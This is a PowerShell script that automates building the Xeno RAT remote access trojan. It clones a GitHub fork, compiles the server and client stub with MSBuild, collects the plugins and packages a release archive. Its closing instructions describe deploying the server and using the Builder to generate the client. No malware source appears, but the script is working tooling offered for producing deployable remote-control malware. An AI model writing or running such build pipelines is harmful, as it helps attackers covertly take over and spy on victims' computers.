<#
.SYNOPSIS
    Automatic build of Xeno RAT from source code (vola branch)

.DESCRIPTION
    This script automates the Xeno RAT build process on Windows:
    - Checks for required tools (Git, MSBuild, NuGet)
    - Clones the repository (vola branch)
    - Restores NuGet packages
    - Compiles server and client
    - Creates release folder with ready files
    - Creates distribution archive

.PARAMETER BuildPath
    Path for project build. Default: C:\XenoRAT-Build

.PARAMETER Branch
    Repository branch to build. Default: vola

.EXAMPLE
    .\Build-XenoRAT.ps1
    
.EXAMPLE
    .\Build-XenoRAT.ps1 -BuildPath "D:\MyBuilds" -Branch "main"

.NOTES
    Author: DeepSeek
	t.me/inM9MYYujEms
    Date: 2025-08-08
    Requirements: Windows 10/11/Server 2019+, .NET Framework 4.8 SDK
#>

param(
    [string]$BuildPath = "C:\XenoRAT-Build",
    [string]$Branch = "vola"
)

# Colors for output
$Host.UI.RawUI.ForegroundColor = "White"

function Write-ColorOutput {
    param(
        [string]$Message,
        [string]$Color = "White"
    )
    Write-Host $Message -ForegroundColor $Color
}

function Write-Step {
    param([string]$Message)
    Write-ColorOutput "`n===> $Message" "Cyan"
}

function Write-Success {
    param([string]$Message)
    Write-ColorOutput "[OK] $Message" "Green"
}

function Write-Error-Custom {
    param([string]$Message)
    Write-ColorOutput "[ERROR] $Message" "Red"
}

function Write-Warning-Custom {
    param([string]$Message)
    Write-ColorOutput "[WARNING] $Message" "Yellow"
}

# Header
Clear-Host
Write-ColorOutput @"
+==============================================================+
|                                                              |
|              Xeno RAT - Automatic Build                      |
|                                                              |
|  Repository: pitBULLusTO/xeno-rat                            |
|  Branch: $Branch                                             |
|                                                              |
+==============================================================+
"@ "Cyan"

# Step 1: Check administrator privileges
Write-Step "Checking administrator privileges"
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Warning-Custom "Script is running without administrator privileges. Some operations may fail."
    Write-Host "It is recommended to run PowerShell as administrator." -ForegroundColor Yellow
    $continue = Read-Host "Continue? (y/n)"
    if ($continue -ne 'y') {
        exit 1
    }
} else {
    Write-Success "Script is running with administrator privileges"
}

# Step 2: Check Git availability
Write-Step "Checking Git availability"
try {
    $gitVersion = git --version 2>&1
    Write-Success "Git is installed: $gitVersion"
} catch {
    Write-Error-Custom "Git is not installed!"
    Write-Host "Download and install Git: https://git-scm.com/download/win" -ForegroundColor Yellow
    exit 1
}

# Step 3: Find MSBuild
Write-Step "Finding MSBuild"
$msbuildPaths = @(
    "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe",
    "C:\Program Files\Microsoft Visual Studio\2022\Professional\MSBuild\Current\Bin\MSBuild.exe",
    "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\MSBuild\Current\Bin\MSBuild.exe",
    "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\MSBuild\Current\Bin\MSBuild.exe",
    "C:\Program Files (x86)\Microsoft Visual Studio\2019\Professional\MSBuild\Current\Bin\MSBuild.exe",
    "C:\Program Files (x86)\Microsoft Visual Studio\2019\Enterprise\MSBuild\Current\Bin\MSBuild.exe",
    "C:\Program Files (x86)\Microsoft Visual Studio\2017\BuildTools\MSBuild\15.0\Bin\MSBuild.exe"
)

$msbuildPath = $null
foreach ($path in $msbuildPaths) {
    if (Test-Path $path) {
        $msbuildPath = $path
        break
    }
}

if ($null -eq $msbuildPath) {
    Write-Error-Custom "MSBuild not found!"
    Write-Host @"
Install one of the following components:
1. Visual Studio 2019/2022 (Community/Professional/Enterprise)
2. Build Tools for Visual Studio: https://visualstudio.microsoft.com/downloads/#build-tools-for-visual-studio-2022
   During installation, select: .NET desktop build tools
"@ -ForegroundColor Yellow
    exit 1
}

Write-Success "MSBuild found: $msbuildPath"

# Step 4: Check NuGet
Write-Step "Checking NuGet availability"
$nugetPath = "C:\nuget\nuget.exe"
if (-not (Test-Path $nugetPath)) {
    Write-Warning-Custom "NuGet not found, downloading..."
    $nugetDir = "C:\nuget"
    if (-not (Test-Path $nugetDir)) {
        New-Item -ItemType Directory -Path $nugetDir -Force | Out-Null
    }
    try {
        Invoke-WebRequest -Uri "https://dist.nuget.org/win-x86-commandline/latest/nuget.exe" -OutFile $nugetPath
        Write-Success "NuGet downloaded: $nugetPath"
    } catch {
        Write-Error-Custom "Failed to download NuGet: $_"
        exit 1
    }
} else {
    Write-Success "NuGet found: $nugetPath"
}

# Step 5: Create working directory
Write-Step "Creating working directory"
if (Test-Path $BuildPath) {
    Write-Warning-Custom "Directory $BuildPath already exists"
    $cleanup = Read-Host "Delete and create new? (y/n)"
    if ($cleanup -eq 'y') {
        Remove-Item -Path $BuildPath -Recurse -Force
        Write-Success "Old directory deleted"
    }
}

if (-not (Test-Path $BuildPath)) {
    New-Item -ItemType Directory -Path $BuildPath -Force | Out-Null
    Write-Success "Directory created: $BuildPath"
}

# Step 6: Clone repository
Write-Step "Cloning repository (branch: $Branch)"
$repoPath = Join-Path $BuildPath "xeno-rat"
if (Test-Path $repoPath) {
    Write-Warning-Custom "Repository already cloned, skipping..."
} else {
    try {
        Set-Location $BuildPath
        git clone --branch $Branch --single-branch https://github.com/pitBULLusTO/xeno-rat.git
        Write-Success "Repository cloned"
    } catch {
        Write-Error-Custom "Clone error: $_"
        exit 1
    }
}

Set-Location $repoPath

# Step 7: Find .sln files
Write-Step "Finding solution files (.sln)"
$slnFiles = Get-ChildItem -Path $repoPath -Filter "*.sln" -Recurse
if ($slnFiles.Count -eq 0) {
    Write-Error-Custom ".sln files not found!"
    exit 1
}

Write-Success "Found .sln files: $($slnFiles.Count)"
foreach ($sln in $slnFiles) {
    Write-Host "  - $($sln.FullName)" -ForegroundColor Gray
}

# Step 8: Restore NuGet packages
Write-Step "Restoring NuGet packages"
foreach ($sln in $slnFiles) {
    Write-Host "Restoring packages for: $($sln.Name)" -ForegroundColor Gray
    try {
        & $nugetPath restore $sln.FullName
        Write-Success "Packages restored for $($sln.Name)"
    } catch {
        Write-Warning-Custom "Package restore error for $($sln.Name): $_"
    }
}

# Step 9: Compile projects
Write-Step "Compiling projects"
$buildConfig = "Release"
$buildPlatform = "Any CPU"

foreach ($sln in $slnFiles) {
    Write-Host "Compiling: $($sln.Name)" -ForegroundColor Gray
    try {
        & $msbuildPath $sln.FullName /p:Configuration=$buildConfig /p:Platform="$buildPlatform" /t:Rebuild /m /v:minimal
        if ($LASTEXITCODE -eq 0) {
            Write-Success "Compilation successful: $($sln.Name)"
        } else {
            Write-Error-Custom "Compilation error: $($sln.Name) (code: $LASTEXITCODE)"
        }
    } catch {
        Write-Error-Custom "Exception during compilation of $($sln.Name): $_"
    }
}

# Step 10: Build release
Write-Step "Building release folder"
$releasePath = Join-Path $BuildPath "XenoRAT-Release"
if (Test-Path $releasePath) {
    Remove-Item -Path $releasePath -Recurse -Force
}
New-Item -ItemType Directory -Path $releasePath -Force | Out-Null

# Find compiled files
$serverExe = Get-ChildItem -Path $repoPath -Filter "xeno rat server.exe" -Recurse | Where-Object { $_.Directory.Name -eq $buildConfig } | Select-Object -First 1
$clientExe = Get-ChildItem -Path $repoPath -Filter "xeno rat client.exe" -Recurse | Where-Object { $_.Directory.Name -eq $buildConfig } | Select-Object -First 1

if ($null -eq $serverExe) {
    Write-Error-Custom "xeno rat server.exe not found in Release!"
} else {
    Copy-Item -Path $serverExe.FullName -Destination $releasePath
    Write-Success "Copied: xeno rat server.exe"
    
    # Copy all DLLs from server directory
    $serverDir = $serverExe.Directory.FullName
    Get-ChildItem -Path $serverDir -Filter "*.dll" | ForEach-Object {
        Copy-Item -Path $_.FullName -Destination $releasePath
    }
    Write-Success "Copied server dependencies"
}

if ($null -eq $clientExe) {
    Write-Warning-Custom "xeno rat client.exe not found in Release (this is normal, client is built through Builder)"
} else {
    # Create stub folder for Builder
    $stubPath = Join-Path $releasePath "stub"
    New-Item -ItemType Directory -Path $stubPath -Force | Out-Null
    Copy-Item -Path $clientExe.FullName -Destination $stubPath
    Write-Success "Copied: stub/xeno rat client.exe"
}

# Copy plugins
$pluginsSource = Join-Path $repoPath "Plugins"
if (Test-Path $pluginsSource) {
    $pluginsRelease = Join-Path $releasePath "Plugins"
    Copy-Item -Path $pluginsSource -Destination $pluginsRelease -Recurse -Force
    Write-Success "Copied plugins"
}

# Step 11: Create archive
Write-Step "Creating archive"
$archivePath = Join-Path $BuildPath "XenoRAT-Release-$Branch.zip"
if (Test-Path $archivePath) {
    Remove-Item -Path $archivePath -Force
}

try {
    Compress-Archive -Path "$releasePath\*" -DestinationPath $archivePath -CompressionLevel Optimal
    Write-Success "Archive created: $archivePath"
} catch {
    Write-Error-Custom "Archive creation error: $_"
}

# Step 12: Summary information
Write-Step "Build completed!"
Write-Host @"

+==============================================================+
|                     BUILD RESULTS                            |
+--------------------------------------------------------------+
|                                                              |
|  Release folder: $releasePath
|  Archive: $archivePath
|                                                              |
|  Release contents:                                           |
"@ -ForegroundColor Green

Get-ChildItem -Path $releasePath -Recurse -File | ForEach-Object {
    $relativePath = $_.FullName.Replace($releasePath, "").TrimStart('\')
    Write-Host "|    - $relativePath" -ForegroundColor Gray
}

Write-Host @"
|                                                              |
+--------------------------------------------------------------+
|                     NEXT STEPS                               |
+--------------------------------------------------------------+
|                                                              |
|  1. Extract the archive on the target machine                |
|  2. Run "xeno rat server.exe" as administrator               |
|  3. Use Builder to create the client                         |
|  4. Read the documentation in the repository                 |
|                                                              |
+==============================================================+
"@ -ForegroundColor Green

Write-Host "`nPress any key to exit..." -ForegroundColor Cyan
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")